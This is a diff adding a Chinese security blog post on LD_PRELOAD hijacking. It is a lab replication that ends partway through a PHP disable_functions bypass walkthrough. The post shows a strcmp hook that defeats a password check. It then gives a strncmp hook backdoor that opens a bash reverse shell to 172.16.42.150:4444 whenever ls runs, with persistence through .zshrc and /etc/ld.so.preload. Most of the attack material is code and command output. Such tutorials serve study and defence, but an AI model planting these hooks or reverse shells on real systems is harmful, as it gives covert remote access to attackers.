@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="e1iwRhdDRUGkBandwtaXVgqhNwYn1qtFuAYbOSPWpcI">
+  <meta name="baidu-site-verification" content="code-NObBqxefR1">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="身是菩提树，心如明镜台。时时勤拂拭，勿使惹尘埃。 菩提本无树，明镜亦非台。本来无一物，何处惹尘埃。  参考Mockingjay师傅的文章进行复现。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LD_PRELOAD学习">
+<meta property="og:url" content="http://example.com/LD-PRELOAD%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="ShadowFl0w">
+<meta property="og:description" content="身是菩提树，心如明镜台。时时勤拂拭，勿使惹尘埃。 菩提本无树，明镜亦非台。本来无一物，何处惹尘埃。  参考Mockingjay师傅的文章进行复现。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/pic/ld_preload.jpg">
+<meta property="article:published_time" content="2022-02-14T01:10:35.000Z">
+<meta property="article:modified_time" content="2022-06-10T12:31:40.730Z">
+<meta property="article:author" content="ShadowFl0w">
+<meta property="article:tag" content="Linux安全">
+<meta property="article:tag" content="红队技术">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/pic/ld_preload.jpg">
+
+<link rel="canonical" href="http://example.com/LD-PRELOAD%E5%AD%A6%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>LD_PRELOAD学习 | ShadowFl0w</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ShadowFl0w</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Nothing</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/LD-PRELOAD%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="ShadowFl0w">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ShadowFl0w">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          LD_PRELOAD学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-14 09:10:35" itemprop="dateCreated datePublished" datetime="2022-02-14T09:10:35+08:00">2022-02-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-06-10 20:31:40" itemprop="dateModified" datetime="2022-06-10T20:31:40+08:00">2022-06-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index"><span itemprop="name">红队技术</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>身是菩提树，心如明镜台。时时勤拂拭，勿使惹尘埃。</p>
+<p>菩提本无树，明镜亦非台。本来无一物，何处惹尘埃。</p>
+</blockquote>
+<p>参考Mockingjay师傅的<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/10/22/Web%E5%AE%89%E5%85%A8/%E6%9C%89%E8%B6%A3%E7%9A%84%20LD_PRELOAD/">文章</a>进行复现。</p>
+<span id="more"></span>
+
+<p>LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。</p>
+<h2 id="1-链接"><a href="#1-链接" class="headerlink" title="1. 链接"></a>1. 链接</h2><p>程序的链接主要有以下三种：</p>
+<ul>
+<li>静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。</li>
+<li>装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。</li>
+<li>运行时动态链接：原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接</li>
+</ul>
+<p>对于动态链接来说，需要一个动态链接库，其作用在于当动态库中的函数发生变化对于可执行程序来说时透明的，可执行程序无需重新编译，方便程序的发布/维护/更新。但是由于程序是在运行时动态加载，这就存在一个问题，假如程序动态加载的函数是恶意的，就有可能导致一些非预期的执行结果或者绕过某些安全设置。</p>
+<h2 id="2-LD-PRELOAD"><a href="#2-LD-PRELOAD" class="headerlink" title="2. LD_PRELOAD"></a>2. LD_PRELOAD</h2><p>LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
+<h2 id="3-LD-PRELOAD-Hook"><a href="#3-LD-PRELOAD-Hook" class="headerlink" title="3. LD_PRELOAD Hook"></a>3. LD_PRELOAD Hook</h2><p>由于 LD_PRELOAD 可以指定在程序运行前优先加载的动态链接库，那我们可以重写程序运行过程中所调用的函数并编译成动态链接库文件，然后通过指定 LD_PRELOAD 让程序优先加载的这个恶意的动态链接库，最后当程序再次运行时便会加载动态链接库中的恶意函数。具体的操作步骤如下：</p>
+<ol>
+<li>定义与目标函数完全一样的函数，包括名称、变量及类型、返回值及类型等。</li>
+<li>将包含替换函数的源码编译为动态链接库。</li>
+<li>通过命令 <code>export LD_PRELOAD=&quot;库文件路径&quot;</code>，设置要优先替换动态链接库即可。</li>
+<li>替换结束，要还原函数调用关系，用命令<code>unset LD_PRELOAD</code> 解除</li>
+</ol>
+<p>下面我们通过一个简单的实例进行演示：</p>
+<p>passcheck.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> passwd[] = <span class="string">&quot;password&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;usage: %s &lt;given-password&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(passwd, argv[<span class="number">1</span>])) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[0;32;32mPassword Correct!\n\033[m&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[0;32;31mPassword Wrong!\n\033[m&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编写如上程序，如过密码等于passwd就打印Password Correct。如果密码错误就打印Password Wrong。</p>
+<p>编译上述程序</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc passcheck.<span class="keyword">c</span> -o passcheck</span><br></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln /tmp]<span class="comment"># gcc passcheck.c -o passcheck</span></span><br><span class="line">[root@vuln /tmp]<span class="comment"># ./passcheck password</span></span><br><span class="line">Password Correct!</span><br><span class="line">[root@vuln /tmp]<span class="comment"># ./passcheck a</span></span><br><span class="line">Password Wrong!</span><br><span class="line">[root@vuln /tmp]<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>现在定义一个strcmp函数编译成.so文件，用LD_PRELOAD加载来劫持原有的strcmp函数</p>
+<ul>
+<li>hook_strcmp.c</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s1, <span class="keyword">const</span> <span class="keyword">char</span> *s2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -<span class="keyword">shared</span> -fPIC hook_strcmp.c -o hook_strcmp.so</span><br></pre></td></tr></table></figure>
+
+<p>加载执行有三种方式：</p>
+<ol>
+<li><p>一次加载</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=<span class="variable">$PWD</span><span class="regexp">/hook_strcmp.so ./</span>passcheck password</span><br></pre></td></tr></table></figure></li>
+<li><p>当前终端有效</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">LD_PRELOAD</span>=<span class="variable">$PWD</span>/hook_strcmp.so</span><br></pre></td></tr></table></figure></li>
+<li><p>永久写入（一般不用这种方式）</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;./hook_strcmp.so&quot;</span> &gt;&gt; <span class="regexp">/etc/</span>ld.so.preload</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>我们这里使用第一种方式</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln /tmp]<span class="comment"># LD_PRELOAD=$PWD/hook_strcmp.so ./passcheck password</span></span><br><span class="line">Password Correct!</span><br><span class="line">[root@vuln /tmp]<span class="comment"># LD_PRELOAD=$PWD/hook_strcmp.so ./passcheck a</span></span><br><span class="line">Password Correct!</span><br></pre></td></tr></table></figure>
+
+<p>发现无论输入什么密码都是正确的。</p>
+<h2 id="4-制作后门"><a href="#4-制作后门" class="headerlink" title="4. 制作后门"></a>4. 制作后门</h2><p>当我们得知了一个系统命令所调用的库函数 后，我们可以重写指定的库函数进行劫持。这里我们以 <code>ls</code> 命令为例进行演示。</p>
+<p>首先查看 <code>ls</code> 这一系统命令会调用哪些库函数：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -Ws <span class="regexp">/usr/</span>bin/ls</span><br></pre></td></tr></table></figure>
+
+<p>选择的是 strncmp 进行Hook</p>
+<ul>
+<li>hook_strncmp.c</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strncmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__s1, <span class="keyword">const</span> <span class="keyword">char</span> *__s2, <span class="keyword">size_t</span> __n)</span> </span>&#123;    <span class="comment">// 这里函数的定义可以根据报错信息进行确定</span></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -<span class="keyword">shared</span> -fPIC hook_strncmp.c -o hook_strncmp.so</span><br></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln /tmp]# <span class="builtin-name">export</span> <span class="attribute">LD_PRELOAD</span>=<span class="variable">$PWD</span>/hook_strncmp.so</span><br><span class="line">[root@vuln /tmp]# ls</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) 组=0(root)</span><br><span class="line">hook_strcmp.c  hook_strcmp.so  hook_strncmp.c  hook_strncmp.so  passcheck  passcheck.c</span><br><span class="line">[root@vuln /tmp]#</span><br></pre></td></tr></table></figure>
+
+<p>利用这种思路，我们可以制作一个隐藏得 Linux 后门，比如当管理员执行 <code>ls</code> 命令时会反弹一个 Shell：</p>
+<ul>
+<li>hook_strncmp.c</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/172.16.42.150/4444 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strncmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__s1, <span class="keyword">const</span> <span class="keyword">char</span> *__s2, <span class="keyword">size_t</span> __n)</span> </span>&#123;    <span class="comment">// 这里函数的定义可以根据报错信息进行确定</span></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -<span class="keyword">shared</span> -fPIC hook_strncmp.c -o hook_strncmp.so</span><br></pre></td></tr></table></figure>
+
+<p>然后在 <code>.bashrc</code> 中写入，我这里用的是zsh，所以写入了.zshrc：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">LD_PRELOAD</span>=/tmp/hook_strncmp.so</span><br></pre></td></tr></table></figure>
+
+<p>执行ls成功收到了shell</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[root@debian ~]</span># nc -lvvp <span class="number">4444</span></span><br><span class="line">listening on <span class="string">[any]</span> <span class="number">4444</span> ...</span><br><span class="line"><span class="number">172.16.42.151</span>: inverse host lookup failed: Unknown host</span><br><span class="line">connect to <span class="string">[172.16.42.150]</span> from (UNKNOWN) <span class="string">[172.16.42.151]</span> <span class="number">4124</span></span><br></pre></td></tr></table></figure>
+
+<p>这种方式，会影响系统运行，我在执行vim后就会卡顿。</p>
+<h2 id="5-绕过-Disable-Functions"><a href="#5-绕过-Disable-Functions" class="headerlink" title="5. 绕过 Disable_Functions"></a>5. 绕过 Disable_Functions</h2><p>有四种绕过 disable_functions 的手法：第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p>
+<p>基于LD_PRELOAD 劫持系统函数这一思路，将突破 disable_functions 限制执行操作系统命令这一目标，大致分解成以下几个步骤：</p>
+<blockquote>
+<p> 找到启动新进程的php函数—&gt;找到php函数调用的库函数—&gt;用LD_PRELOAD劫持库函数的调用</p>
+</blockquote>
+<h3 id="5-1-启动新进程的php函数"><a href="#5-1-启动新进程的php函数" class="headerlink" title="5.1 启动新进程的php函数"></a>5.1 启动新进程的php函数</h3><p>找寻内部启动新进程的 PHP 函数。虽然 LD_PRELOAD 为我提供了劫持系统函数的能力，但前提是我得控制 php 启动外部程序才行（只要有进程启动行为即可，无所谓是谁）。常见的 system() 启动程序方式显然不行，否则就不存在突破 disable_functions 一事了。尝试一些可能启动进程的函数</p>
+<ul>
+<li>尝试<code>Imagick()</code></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln html]<span class="comment"># touch image.php</span></span><br><span class="line">[root@vuln html]<span class="comment"># vim image.php</span></span><br><span class="line">[root@vuln html]<span class="comment"># cat image.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$img</span> = <span class="keyword">new</span> Imagick();</span><br><span class="line">	<span class="variable">$img</span> -&gt; newImage(<span class="number">500</span>,<span class="number">300</span>,<span class="string">&#x27;black&#x27;</span>, <span class="string">&#x27;png&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">[root@vuln html]<span class="comment">#  strace -f php image.php 2&gt;&amp;1 | grep -A2 -B2 execve</span></span><br><span class="line">execve(<span class="string">&quot;/usr/bin/php&quot;</span>, [<span class="string">&quot;php&quot;</span>, <span class="string">&quot;image.php&quot;</span>], <span class="number">0x7ffdce692b00</span> <span class="comment">/* 28 vars */</span>) = <span class="number">0</span></span><br><span class="line">brk(<span class="literal">NULL</span>)                               = <span class="number">0x55ce347f1000</span></span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.preload&quot;</span>, R_OK)      = -<span class="number">1</span> ENOENT (没有那个文件或目录)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>第一个 execve 是启动 PHP 解释器而已，必须找到第二个 execve，没有则说明并未启动新进程</p>
+<ul>
+<li>尝试<code>mail()</code></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    mail(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln html]# strace -f php mail.php <span class="number">2</span>&gt;&amp;<span class="number">1</span> | grep -<span class="symbol">A2</span> -<span class="symbol">B2</span> execve</span><br><span class="line">execve(<span class="string">&quot;/usr/bin/php&quot;</span>, [<span class="string">&quot;php&quot;</span>, <span class="string">&quot;mail.php&quot;</span>], <span class="number">0x7ffcf2ce70f0</span> <span class="comment">/* 28 vars */</span>) = <span class="number">0</span></span><br><span class="line">brk(<span class="symbol">NULL</span>)                               = <span class="number">0x561cadfcf000</span></span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.preload&quot;</span>, <span class="symbol">R_OK</span>)      = <span class="number">-1</span> <span class="symbol">ENOENT</span> (没有那个文件或目录)</span><br><span class="line">--</span><br><span class="line">[pid <span class="number">19699</span>] set_robust_list(<span class="number">0x7f039d1d2e60</span>, <span class="number">24</span>) = <span class="number">0</span></span><br><span class="line">[pid <span class="number">19699</span>] dup2(<span class="number">3</span>, <span class="number">0</span>)                  = <span class="number">0</span></span><br><span class="line">[pid <span class="number">19699</span>] execve(<span class="string">&quot;/bin/sh&quot;</span>, 